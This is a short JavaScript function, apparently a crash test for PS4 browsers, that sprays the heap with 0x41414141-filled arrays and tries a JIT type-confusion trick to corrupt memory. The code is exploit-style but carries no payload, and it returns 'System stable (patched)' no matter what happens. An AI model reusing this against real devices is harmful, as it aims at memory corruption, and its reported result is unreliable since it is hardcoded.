export function testKernelPanic() {
    // Step 1: Heap spray to destabilize memory
    const spray = [];
    for (let i = 0; i < 0x200; i++) {
        spray.push(new Uint32Array(0x1000).fill(0x41414141));
    }

    // Step 2: JIT abuse to corrupt vtable
    let arr = [1.1];
    function confuse(x) {
        return x[0] + 1;
    }
    for (let i = 0; i < 1e6; i++) confuse(arr);
    confuse({ [Symbol.toPrimitive]: () => (arr[0] = {}) });

    // Step 3: If vulnerable, PS4 freezes/crashes
    return "System stable (patched)";
}
